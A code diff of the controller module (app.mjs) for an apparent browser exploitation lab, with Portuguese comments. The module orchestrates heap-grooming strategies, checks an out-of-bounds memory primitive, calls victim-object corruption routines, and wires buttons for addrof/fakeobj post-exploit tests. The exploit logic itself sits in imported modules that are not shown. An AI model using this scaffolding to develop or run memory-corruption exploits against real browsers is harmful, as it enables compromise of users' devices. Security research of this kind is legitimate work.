@@ -5,13 +5,13 @@ import * as Core from './core_exploit.mjs';
 import * as Groomer from './heap_groomer.mjs';
 import * as Corruptor from './victim_corruptor.mjs';
 import * as PostExploit from './post_exploit_conceptual.mjs';
-import { updateOOBConfigFromUI as updateGlobalOOBConfig} from './config.mjs';
+import { updateOOBConfigFromUI as updateGlobalOOBConfig } from './config.mjs';
 
 const App = {
     runAllGroomingStrategies: async () => {
         const FNAME_STRAT = "App.runAllGroomingStrategies";
         appLog(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
-        updateGlobalOOBConfig(); // Atualiza OOB_CONFIG com valores da UI
+        updateGlobalOOBConfig();
         const spray_count_el = document.getElementById('sprayCountBase');
         const intermediate_allocs_el = document.getElementById('intermediateAllocs');
 
@@ -34,9 +34,8 @@ const App = {
             appLog(`*** Iniciando Estratégia de Grooming: ${strat.name} ***`, "critical", FNAME_STRAT);
 
             let victimPrepared = false;
-            let currentOOBAllocationSize = Core.getOOBAllocationSize(); // Pega o tamanho da config global (já atualizada)
+            let currentOOBAllocationSize = Core.getOOBAllocationSize();
             appLog(`   Estratégia '${strat.name}' usando OOB_ALLOCATION_SIZE: ${currentOOBAllocationSize}`, "info", FNAME_STRAT);
-
 
             if (strat.oob_first) {
                 appLog(`   Estratégia '${strat.name}': OOB será ativado primeiro.`, "info", FNAME_STRAT);
@@ -57,26 +56,24 @@ const App = {
                 }
             }
 
-            // Logs de diagnóstico cruciais
             appLog(`   Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object existe: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
             if (Groomer.victim_object) {
                 appLog(`      Groomer.victim_object.length: ${Groomer.victim_object.length}`, "info", FNAME_STRAT);
             }
 
-
             if (!victimPrepared) {
                 appLog(`   Estratégia '${strat.name}': Falha ao preparar vítima (victimPrepared é false). Pulando corrupção.`, "error", FNAME_STRAT);
-                await PAUSE_LAB(500); // Pequena pausa antes da próxima estratégia
+                await PAUSE_LAB(500);
                 continue;
             }
 
             if (!Groomer.victim_object) {
                  appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO FINAL CHECK: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
-                 await PAUSE_LAB(500); // Pequena pausa
+                 await PAUSE_LAB(500);
                  continue;
             }
 
-            if (!Core.oob_dataview_real) { // Checagem adicional, especialmente se OOB é ativado depois da vítima
+            if (!Core.oob_dataview_real) {
                 appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO: Primitiva OOB não está ativa ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                 await PAUSE_LAB(500);
                 continue;
@@ -84,15 +81,15 @@ const App = {
 
             appLog(`   Estratégia '${strat.name}': Vítima OK, OOB OK. Tentando corrupção...`, "info", FNAME_STRAT);
             await Corruptor.findAndCorruptVictimFields_Iterative();
-            await PAUSE_LAB(2000); // Pausa entre estratégias
-        }
+            await PAUSE_LAB(2000);
+        } // Fim do loop for (const strat of strategies)
         appLog(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
         if (Corruptor.getLastSuccessfulGap() === null) { appLog("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
          else {
             const addrofGapEl = document.getElementById('addrofGap');
             if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
          }
-    },
+    }, // Fim de runAllGroomingStrategies
 
     updateCurrentTestGapFromScanUIAndTestSingle: () => {
         const gapStartScanEl = document.getElementById('gapStartScan');
@@ -107,7 +104,7 @@ const App = {
             }
             Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
         } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
-    },
+    }, // Fim de updateCurrentTestGapFromScanUIAndTestSingle
 
     setupUIEventListeners: () => {
         const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
@@ -115,12 +112,11 @@ const App = {
             moduleTestButtonsContainer.innerHTML = '';
             const btnTestInt64 = document.createElement('button');
             btnTestInt64.textContent = 'Testar Módulo Int64';
-            btnTestInt64.onclick = () => Int64Lib.testModule(appLog); // Passa appLog
+            btnTestInt64.onclick = () => Int64Lib.testModule(appLog);
             moduleTestButtonsContainer.appendChild(btnTestInt64);
 
             const btnTestUtils = document.createElement('button');
             btnTestUtils.textContent = 'Testar Módulo Utils';
-            // utils.testModule usa 'log' global que é o appLog de utils.mjs
             btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule());
             moduleTestButtonsContainer.appendChild(btnTestUtils);
 
@@ -139,4 +135,34 @@ const App = {
         document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
         document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
         document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', Corruptor.findAndCorruptVictimFields_Iterative);
-        document.getElementById('btnTestKnownGap')?.addEventListener('click', Corruptor.
+        document.getElementById('btnTestKnownGap')?.addEventListener('click', Corruptor.testCorruptKnownGap);
+        document.getElementById('btnSetupAddrofConceptual')?.addEventListener('click', PostExploit.setup_addrof_fakeobj_pair_conceptual);
+        document.getElementById('btnTestAddrofConceptual')?.addEventListener('click', PostExploit.test_addrof_conceptual);
+        document.getElementById('btnTestFakeobjConceptual')?.addEventListener('click', PostExploit.test_fakeobj_conceptual);
+
+        document.getElementById('oobAllocSize')?.addEventListener('change', updateGlobalOOBConfig);
+        document.getElementById('baseOffset')?.addEventListener('change', updateGlobalOOBConfig);
+        document.getElementById('initialBufSize')?.addEventListener('change', updateGlobalOOBConfig);
+    }, // Fim de setupUIEventListeners
+
+    initialize: () => {
+        updateGlobalOOBConfig();
+        App.setupUIEventListeners();
+        appLog("Laboratório Modularizado (v2.8.3 - Diagnóstico Vítima) pronto para testes.", "good", "App.Init"); // Mantendo a versão da última correção funcional dos módulos
+
+        const addrofGapEl = document.getElementById('addrofGap');
+        if (addrofGapEl && Corruptor.getLastSuccessfulGap() !== null) {
+             addrofGapEl.value = Corruptor.getLastSuccessfulGap();
+        }
+    } // Fim de initialize
+}; // Fim do objeto App
+
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', App.initialize);
+} else {
+    App.initialize();
+}
+
+appLog("app.mjs carregado e pronto.", "info", "Global");
+// Linha 143 estaria aqui ou perto. Assegure-se que não há nada após este log que possa estar incompleto.
+// Verificando que todos os blocos acima estão fechados. O objeto App está fechado. O if/else está fechado.
